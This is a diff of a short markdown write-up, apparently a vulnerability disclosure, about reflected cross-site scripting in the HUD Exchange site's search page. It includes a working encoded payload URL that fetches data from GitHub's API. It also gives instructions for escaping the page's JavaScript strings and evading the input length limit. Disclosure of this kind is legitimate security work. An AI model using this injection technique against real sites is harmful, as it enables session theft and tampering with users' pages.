@@ -8,17 +8,14 @@ HUD Exchange is an official website of the Department of Housing and Urban Devel
 
 I reported this bug in detail through the contact mechanism on the HUD Exchange site on September 22, 2022.
 
-##Demo
-
+## Demo
 This `fetch()`es my commit info from Github and parses it, then alerts my name.
 <https://www.hudexchange.info/search/?dsp=&ct=&collection=&q=%5C%27%3B%20%2F*%20"%3B%20%2F%2F%20*%2F%20fetch%28%22https%3A//api.github.com/repos/trevorgross/installarch/commits%22%29.then%28response%20%3D%3E%20response.json%28%29%29.then%28commits%20%3D%3E%20alert%28commits%5B0%5D.commit.author.name%29%29%3B%20//>
 
-##Why
-
+## Why
 A user's improperly sanitized search string is inserted into two JavaScript variables in the search results page. The failure to properly sanitize or escape the strings makes it trivial to execute arbitrary JavaScript.
 
-##How
-
+## How
 Go to <https://www.hudexchange.info/search>. Start a search query with `\'; /* "; // */` and end it with `//`. Put whatever JavaScript you want between those strings. To get around the text input length limit, add another leading backslash to the first comment string (so it doesn't get stripped when encoding), wrap your JavaScript in the comment strings, encode it all with encodeURI(), and tack the encoded string on to the search URL after ?q=. E.g. ``encodeURI(`\\'; /* "; // */ [YOUR_JS_HERE] //`);``
 
 ##Details
